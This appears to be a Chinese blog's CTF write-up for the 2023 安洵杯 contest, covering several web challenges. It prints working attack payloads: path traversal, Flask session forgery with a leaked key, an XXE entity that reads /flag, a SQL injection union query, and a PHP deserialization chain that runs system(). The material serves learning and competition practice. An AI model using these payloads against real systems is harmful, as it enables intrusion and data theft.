@@ -1,0 +1,297 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023SYCTF&#34;安洵杯&#34;]赛后总结（摆烂版） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023SYCTF&#34;安洵杯&#34;]赛后总结（摆烂版） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="最快速，最新鲜，最主观的挨打体验。
+5道web，看了4道，细看3道，解出1道，可以说是相当菜了。可恶啊😡😡😡
+CarelessPy
+打开主页，提示了三个路由/eval、/login和/download?file=
+eval里提示可以通..." />
+    <meta name="keywords" content="赛后总结,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023SYCTF&#34;安洵杯&#34;]赛后总结（摆烂版）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-10
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
+                  # 赛后总结
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-an-xun-bei-sai-hou-zong-jie-kuai-su-ban.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>最快速，最新鲜，最主观的挨打体验。</p>
+<p>5道web，看了4道，细看3道，解出1道，可以说是相当菜了。可恶啊😡😡😡</p>
+<h1 id="carelesspy">CarelessPy</h1>
+<p>打开主页，提示了三个路由<code>/eval</code>、<code>/login</code>和<code>/download?file=</code></p>
+<p><code>eval</code>里提示可以通过<code>?cmd=</code>传入命令，但测了之后应该是<code>scandir()</code>的参数，不过可以通过这个找到了<code>/app/__pycache__/part.cpython-311.pyc</code>。</p>
+<p>用<code>/download?file=../../../app/__pycache__/part.cpython-311.pyc</code>下载，反编译得到<code>part.py</code>的源码，其中有<code>SECRET_KEY</code>：</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# visit https://tool.lu/pyc/ for more information
+# Version: Python 3.11
+
+import os
+import random
+import hashlib
+from flask import *
+from lxml import etree
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'o2takuXX_donot_like_ntr'
+</code></pre>
+<p>在<code>/login</code>页面用密钥解开<code>session</code>，重新构造<code>{'islogin': True}</code>登录。<br>
+<img src="https://skyblu3519.github.io/post-images/1686407224689.png" alt="" loading="lazy"></p>
+<p>XML外部实体注入：</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;
+&lt;result&gt;
+&lt;ctf&gt;123123&lt;/ctf&gt;
+&lt;web&gt;&amp;xxe;&lt;/web&gt;
+&lt;/result&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686407457216.png" alt="" loading="lazy"></figure>
+<p>感想：XXE确实没好好学过，最后一步卡了半天😢</p>
+<h1 id="confronting-robot">Confronting robot</h1>
+<p>第一个注入点是<code>?myname=</code>，没有过滤，使用联合查询<code>sky' union select (select group_concat(username) from name)--+</code>找到<code>/sEcR@t_n@Bodyknow.php</code><br>
+<img src="https://skyblu3519.github.io/post-images/1686407820529.png" alt="" loading="lazy"></p>
+<p>然后就尬住了。<code>/sEcR@t_n@Bodyknow.php</code>可以执行sql语句，得知game为空，以及它的两个字段<code>choice</code>和<code>round</code>。</p>
+<p><code>game.php</code>里有这个猜拳机器人的逻辑，但是数据库为空执行会报错<br>
+<img src="https://skyblu3519.github.io/post-images/1686410508631.png" alt="" loading="lazy"></p>
+<p>这里<code>loseorwin</code>函数中的NULL就是查询的结果<br>
+<code>Fatal error: Uncaught TypeError: Argument 2 passed to loseorwin() must be of the type string, null given, called in /var/www/html/game.php on line 38 and defined in /var/www/html/game.php:11 Stack trace: #0 /var/www/html/game.php(38): loseorwin('S', NULL) #1 {main} thrown in /var/www/html/game.php on line 11</code></p>
+<p>知道了字段，也可以执行sql语句，我的思路就是插入数据到game表中。但是权限不够，无法插入数据，这题最终也没有解出。</p>
+<p>感想：解这道题耗得最久的一步就是在第一部分，当时用想着这么简单的注入直接上sqlmap，结果跑了个空表出来。<br>
+<img src="https://skyblu3519.github.io/post-images/1686418565402.png" alt="" loading="lazy"><br>
+然后就尝试各种写文件，人都麻了🤡</p>
+<h1 id="4号的罗纳尔多">4号的罗纳尔多</h1>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+class evil{
+    public $cmd;
+    public $a;
+    public function __destruct(){
+        if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd))){
+            eval($this-&gt;cmd.'givemegirlfriend!');
+        } else {
+            echo 'nonono';
+        }
+    }
+}
+
+if(!preg_match('/^[Oa]:[\d]+|Array|Iterator|Object|List/i',$_GET['Pochy'])){
+    unserialize($_GET['Pochy']);
+} else {
+    echo 'nonono';
+}
+</code></pre>
+<p>第一个正则的绕过方法参考：<a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">愚人杯3rd easy_php</a></p>
+<p>用脚本找个符合要求的类：</p>
+<pre><code class="language-php">$classes = get_declared_classes();
+foreach ($classes as $class) {
+    $methods = get_class_methods($class);
+    foreach ($methods as $method) {
+        if (in_array($method, array('unserialize',))) {
+            print $class . '::' . $method . &quot;\n&quot;;
+        }
+    }
+}
+</code></pre>
+<p>这个正则匹配的是<code>O:</code>或<code>a:</code>开头或字符串中间出现<code>Array|Iterator|Object|List</code>的字符串，这里选用SplQueue类绕过第一个正则：</p>
+<pre><code class="language-php">&lt;?php
+class evil{
+    public $cmd;
+    public $a;
+
+}
+$a = new evil();
+$queue = new SplQueue();
+//echo serialize($queue);
+$queue-&gt;enqueue($a);
+echo serialize($queue);
+</code></pre>
+<p>现在就让eval执行命令即可，<code>if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd)))</code>这个条件让<code>$cmd</code>中只能出现大小写字符、左右括号、分号和下划线。</p>
+<p>目的是避免<code>givemegirlfriend!</code>对<code>$cmd</code>拼接导致的eval无法执行。</p>
+<p>使用<code>__halt_compiler();</code>是一个语言构造器，它会立即停止编译器的解析，POP链构造：</p>
+<pre><code class="language-php">&lt;?php
+class evil{
+    public $cmd='system(ls);__halt_compiler();';
+    public $a;
+
+}
+$a = new evil();
+$queue = new SplQueue();
+//echo serialize($queue);
+$queue-&gt;enqueue($a);
+echo serialize($queue);
+</code></pre>
+<p>本地成功了但是服务器却没反应？！！！<br>
+<img src="https://skyblu3519.github.io/post-images/1686421622958.png" alt="" loading="lazy"></p>
+<p>然后比赛就结束了😭</p>
+<h1 id="task">task</h1>
+<p>这题点开简单看了下，似乎是Go的，不太会捏。</p>
+<h1 id="总结">总结</h1>
+<p>体感其实还蛮不错的，而且队友都很给力！下次干回来！！！</p>
+<p>之后等wp出了再把这次比赛的知识点好好总结一下，就先这样咯～</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#carelesspy">CarelessPy</a></li>
+<li><a href="#confronting-robot">Confronting robot</a></li>
+<li><a href="#4%E5%8F%B7%E7%9A%84%E7%BD%97%E7%BA%B3%E5%B0%94%E5%A4%9A">4号的罗纳尔多</a></li>
+<li><a href="#task">task</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yi-zhou-ctf-shua-ti-zong-jie/">
+              <h3 class="post-title">
+                一周CTF刷题总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
